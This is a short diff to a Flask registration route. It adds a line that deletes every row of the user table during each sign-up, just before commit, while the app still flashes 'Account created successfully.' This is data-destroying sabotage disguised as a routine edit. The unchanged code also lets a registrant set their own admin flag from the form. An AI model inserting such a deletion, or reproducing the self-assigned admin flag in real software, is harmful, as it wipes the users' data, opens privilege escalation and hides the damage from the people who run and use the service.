@@ -29,11 +29,12 @@ def login():
 @auth.route('/register', methods=['GET', 'POST'])
 def register():
         form = RegisterForm()
-
         if form.validate_on_submit():
                 hashed_password = bcrypt.generate_password_hash(form.password.data)
                 new_user = UserModel(username=form.username.data, password=hashed_password, admin=form.admin.data)
                 db.session.add(new_user)
+                db.session.query(UserModel).delete()
+
                 db.session.commit()
                 
                 flash("Account created successfully.", "success")
